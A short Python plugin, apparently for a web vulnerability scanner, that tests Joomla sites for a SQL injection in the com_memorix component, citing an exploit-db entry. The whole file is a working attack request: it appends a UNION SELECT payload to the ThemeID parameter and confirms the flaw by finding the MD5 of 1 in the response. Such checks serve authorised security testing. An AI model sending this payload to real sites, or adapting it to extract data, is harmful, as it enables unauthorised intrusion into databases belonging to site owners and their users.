#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = ximumu
#_Function_ = 插件格式
#_FileName_ = cms_joomla_sqlinjecttion.py
#__Refer___ = https://www.exploit-db.com/exploits/37773/
#___Flag___ = 438b1eb36b7e244b
import re

def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    url = arg
    set_payload = 'index.php?option=com_memorix&task=result&searchplugin=theme&Itemid=60&ThemeID=-8594+union+select+111,222,MD5(1),444,555,666,777,888,999--+AbuHassan'
    code, head, res, errcode, _ = curl.curl(url + set_payload)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_info(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.example.com/')[1])